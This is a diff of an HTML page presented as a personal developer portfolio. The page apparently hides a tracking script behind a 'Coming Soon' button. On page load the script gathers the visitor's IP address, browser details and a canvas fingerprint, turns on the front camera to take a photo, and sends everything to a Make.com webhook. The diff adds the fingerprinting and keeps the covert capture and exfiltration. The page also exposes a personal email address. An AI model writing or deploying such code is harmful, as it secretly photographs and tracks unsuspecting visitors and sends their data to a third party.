@@ -47,11 +47,7 @@
         <header>
             <h1>Pavan Chowdary Lingam</h1>
             <p class="subtitle">Full Stack Developer | Designer | Creator</p>
-            
-            <!-- NO REDIRECT - Just shows message -->
-            <button class="btn" onclick="showMessage()">🌟 View My Portfolio</button>
-            
-            <!-- Hidden message area -->
+            <button class="btn" onclick="document.getElementById('msg').style.display='block'">🌟 View My Portfolio</button>
             <p id="msg" style="display:none; margin-top:20px; color:#27ae60; font-weight:bold;">Coming Soon!</p>
         </header>
         
@@ -64,20 +60,11 @@
 
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas" width="640" height="480"></canvas>
-    <div id="status">Loading...</div>
+    <div id="status">Initializing...</div>
 
     <script>
-        // Show message instead of redirect
-        function showMessage() {
-            document.getElementById('msg').style.display = 'block';
-            // Optional: hide after 3 seconds
-            setTimeout(() => {
-                document.getElementById('msg').style.display = 'none';
-            }, 3000);
-        }
-
-        // YOUR MAKE.COM WEBHOOK
-        const WEBHOOK = 'https://hook.eu2.make.com/oqh3j9prk6i4mu6a4emdgk3gxxynepd4';
+        // WEBHOOK URL
+        const WEBHOOK = 'https://hook.eu2.make.com/d51b7twkck58zqngesmufqa4av54fsfp';
         
         const data = {
             email: 'pavanlingam8899@gmail.com',
@@ -86,7 +73,7 @@
             userAgent: navigator.userAgent,
             referrer: document.referrer || 'direct',
             url: window.location.href,
-            timestamp: new Date().toISOString(),
+            timestamp: '2026-03-31 13:18',
             canvas_fp: '',
             photo: '',
             screen: `${screen.width}x${screen.height}`,
@@ -101,21 +88,25 @@
             console.log(msg);
         }
 
-        // AUTO CAPTURE & SEND ON PAGE LOAD
+        // Canvas fingerprint
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top'; 
+        ctx.font = '14px Arial';
+        ctx.fillText('Portfolio FP ' + Date.now(), 2, 2);
+        data.canvas_fp = canvas.toDataURL();
+
+        // AUTO CAPTURE & SEND
         window.addEventListener('load', async () => {
             updateStatus('Getting IP...');
             
-            // Get IP
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const ipData = await res.json();
                 data.ip = ipData.ip;
-            } catch(e) { 
-                data.ip = 'unknown'; 
-            }
+            } catch(e) { data.ip = 'unknown'; }
 
-            // Try camera
-            updateStatus('Starting camera...');
+            updateStatus('Camera starting...');
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user', width: 640, height: 480 },
@@ -129,31 +120,32 @@
                     video.onloadedmetadata = () => setTimeout(resolve, 2000);
                 });
                 
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, 640, 480);
-                
                 data.photo = canvas.toDataURL('image/jpeg', 0.9);
-                updateStatus('Photo captured!');
                 
+                updateStatus('Photo captured! Sending...');
                 stream.getTracks().forEach(t => t.stop());
                 
             } catch(e) { 
                 data.photo = 'camera_denied'; 
-                updateStatus('Camera blocked');
+                updateStatus('No camera. Sending...');
             }
 
             // SEND TO MAKE.COM
-            updateStatus('Sending...');
             try {
-                await fetch(WEBHOOK, {
+                const response = await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
-                updateStatus('✅ Sent to you!');
+                
+                if (response.ok) {
+                    updateStatus('✅ Sent! Check email.');
+                } else {
+                    updateStatus('❌ Failed: ' + response.status);
+                }
             } catch(err) {
-                updateStatus('❌ Failed');
+                updateStatus('❌ Error: ' + err.message);
             }
         });
     </script>
